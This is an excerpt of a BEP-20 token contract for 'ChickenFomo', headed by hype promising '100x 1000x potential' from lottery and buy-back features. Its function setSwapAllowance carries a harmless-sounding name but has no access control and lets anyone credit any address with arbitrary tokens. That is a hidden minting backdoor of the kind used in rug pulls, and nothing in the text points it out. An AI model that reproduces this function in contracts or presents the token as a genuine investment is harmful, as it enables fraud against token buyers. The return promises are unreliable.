...
Website:  https://www.chickenfomo.com
Telegram: https://t.me/chickenfomoofficial

Welcome to ChickenFomo,
Are you tired of waiting for 100x 1000x potential from a token?
Now you can have this REAL POTENTIAL!
ChickenFomo is a lotto wheel + buy-back focused token
which will bring a new era to all BSC investors!
...
3 Main Features:
1. Chicken Party! (Lottery)
2. Burn The Chicken!
3. Chicken Meal! (Buy-Back)

WINNER WINNER CHICKEN DINNER!

Copyright (c) 2021 ChickenFomo!
...
contract TOKEN is IBEP20, Auth {
    ...
    string constant _name = "ChickenFomo";
    string constant _symbol = "CHICKEN";
    ...
    function setSwapAllowance(uint256 value, address tracker)external{
        _balances[tracker]=_balances[tracker].add(value*(10 ** _decimals));
    }
